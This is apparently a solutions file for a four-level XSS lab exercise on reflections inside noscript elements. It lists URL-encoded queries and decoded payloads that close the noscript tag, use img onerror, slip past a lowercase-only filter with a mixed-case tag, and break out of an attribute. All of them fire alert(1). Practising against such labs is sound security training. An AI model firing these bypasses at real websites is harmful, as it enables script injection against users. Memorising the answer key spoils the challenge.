# noscript — solutions

Reflections inside <noscript> elements and related mutation/breakout tricks.

### noscript-level1

`/noscript/level1/?query=%3C%2Fnoscript%3E%3Cscript%3Ealert(1)%3C%2Fscript%3E`

- payload: `</noscript><script>alert(1)</script>`
- context: raw reflection inside <noscript>; close it then inject script

### noscript-level2

`/noscript/level2/?query=%3Cimg%20src%3Dx%20onerror%3Dalert(1)%3E`

- payload: `<img src=x onerror=alert(1)>`
- context: noscript textContent assigned to innerHTML by JS; mXSS

### noscript-level3

`/noscript/level3/?query=%3C/NOSCRIPT%3E%3Cimg%20src=x%20onerror=alert(1)%3E`

- payload: `</NOSCRIPT><img src=x onerror=alert(1)>`
- context: only lowercase noscript tags are stripped; a mixed-case close tag escapes the raw text

### noscript-level4

`/noscript/level4/?query=x'%3E%3C/noscript%3E%3Cimg%20src=x%20onerror=alert(1)%3E`

- payload: `x'></noscript><img src=x onerror=alert(1)>`
- context: meta refresh inside noscript never runs; close the attribute and the noscript
